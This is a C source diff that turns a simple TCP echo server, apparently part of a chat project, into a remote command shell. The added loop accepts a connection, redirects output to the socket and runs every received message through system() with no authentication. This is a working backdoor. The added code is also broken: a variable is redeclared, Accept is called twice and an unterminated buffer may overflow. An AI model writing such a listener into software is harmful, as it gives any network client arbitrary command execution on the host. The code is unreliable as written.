@@ -17,7 +17,7 @@ int main(int argc, char *argv[])
     //listenfd = serverAdr
     struct sockaddr_in serverAdr = {0};
     struct sockaddr_in clientAddr = {0};
-    pthread_t tid;
+   
 
     int server = Socket(AF_INET, SOCK_STREAM, 0); //протокол
     serverAdr.sin_family = AF_INET;
@@ -31,43 +31,22 @@ int main(int argc, char *argv[])
     socklen_t clieLen = sizeof(clientAddr);
     connfd = Accept(server, (struct sockaddr *) &clientAddr, &clieLen);
 
-    while (1) {
-        char buf[256];
-        ssize_t nread;
-        nread = read(connfd, buf, 256);
-        write(STDOUT_FILENO, buf, nread);
-        write(connfd, buf, nread);
-
-    }
-
-    close(connfd);
-    close(server);
-
-    // while (1)
-    // {
-    //     socklen_t clieLen = sizeof(clientAddr);
-    //     connfd = Accept(server, (struct sockaddr *) &clientAddr, &clieLen);
-
-    //     if((cliCount +1) == MAX_CLIENT)
-    //     {
-    //         printf("Maximum client connected. Connection Rejected\n");
-    //         printIpAddr(clientAddr);
-    //         printf(":%d\n", clientAddr.sin_port);
-	// 		close(connfd);
-	// 		continue;
-    //     }
-
-    //     clients *cli = (clients *)malloc(sizeof(clients));
-    //     cli->addres = clientAddr;
-    //     cli->sockfd = connfd;
-    //     cli->uid = uid++;
-
-    //     //Add client to queue
-    //     //AddInQueue(cli);
-
-    //     sleep(1);
-
-    // }
+    char buf[1024];
+		
+    socklen_t clieLen = sizeof(clientAddr);
+    connfd = Accept(server, (struct sockaddr *) &clientAddr, &clieLen);
+		  
+    dup2(connfd,1);    //redirect stdout
+     while(1)
+     {
+	recv(connfd,buf, MAX_MSG_LENGTH,0);
+	/*If the message recieved was END_STRING, exit this loop*/
+	system(buf);	
+	bzero(buf, MAX_MSG_LENGTH);
+     }	
     
+    close(connfd);
+    sleep(1);
+    close(server);
     return 0;
 }
